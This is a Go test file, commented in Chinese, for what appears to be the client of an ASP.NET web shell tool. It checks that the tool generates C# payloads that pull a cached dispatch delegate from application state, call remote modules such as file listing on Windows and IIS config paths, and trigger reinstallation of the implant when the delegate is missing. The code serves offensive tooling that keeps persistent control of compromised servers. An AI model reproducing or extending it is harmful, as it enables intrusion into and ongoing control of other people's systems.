package shell

import (
	"strings"
	"testing"
)

// aspnet 侧参数从 \x1e/\x1f 打包串改为「键值交替的字符串数组」：由缓存机件 Dispatch 组装成字典后
// 递进模块方法。以下测试锁住这条契约，避免回退成脆弱的打包串编码。

// TestAspnetModCallPairsKey 锁住：modCall 从带代际标记的应用缓存键取出分发委托。
// 旧键名 wsh_dispatch（无代际）在旧部署里仍可能存在，新载荷必须查 wsh_dispatch_pairs，
// 旧键取不到自然回 BOOT_MISSING 触发重装——代际更替的自愈依赖此键名。
func TestAspnetModCallPairsKey(t *testing.T) {
	a := aspnetShell{}
	got := a.modCall("fs.list", `new string[]{"dir","C:\\Windows"}`)
	if !strings.Contains(got, `Application["wsh_dispatch_pairs"]`) {
		t.Fatalf("modCall 应从 wsh_dispatch_pairs 取分发委托:\n%s", got)
	}
	if strings.Contains(got, `Application["wsh_dispatch"]`) {
		t.Fatalf("modCall 不得再查无代际的旧键 wsh_dispatch:\n%s", got)
	}
	if !strings.Contains(got, "BOOT_MISSING") {
		t.Fatalf("委托缺失应回 BOOT_MISSING 触发自愈:\n%s", got)
	}
}

// TestAspnetEncodeArgsArray 锁住：参数编码为 C# 字符串数组字面量（键/值交替），
// 空参数用 null（比 new string[]{} 省字节）。值由 csStr 独立转义，任意字符串都安全。
func TestAspnetEncodeArgsArray(t *testing.T) {
	a := aspnetShell{}
	single := a.encodeArgs(map[string]any{"dir": `C:\Windows\System32\inetsrv\config`})
	if !strings.HasPrefix(single, "new string[]{") || !strings.HasSuffix(single, "}") {
		t.Fatalf("非空参数应编为字符串数组字面量，实际: %q", single)
	}
	if !strings.Contains(single, `"dir"`) || !strings.Contains(single, `C:\\Windows`) {
		t.Fatalf("键与值应各自 csStr 转义:\n%s", single)
	}

	empty := a.encodeArgs(map[string]any{})
	if empty != "null" {
		t.Fatalf("空参数应编为 null，实际: %q", empty)
	}
}

// TestAspnetModCallPassesArray 锁住：modCall 把 encodeArgs 的数组字面量原样作为
// DynamicInvoke 的第三实参（不再额外 csStr 包成字符串，那是旧打包串做法）。
func TestAspnetModCallPassesArray(t *testing.T) {
	a := aspnetShell{}
	arg := a.encodeArgs(map[string]any{"dir": "."})
	got := a.modCall("fs.list", arg)
	if !strings.Contains(got, `__d.DynamicInvoke("fs","list",`+arg+`)`) {
		t.Fatalf("modCall 应原样把数组字面量作第三实参:\n%s", got)
	}
}
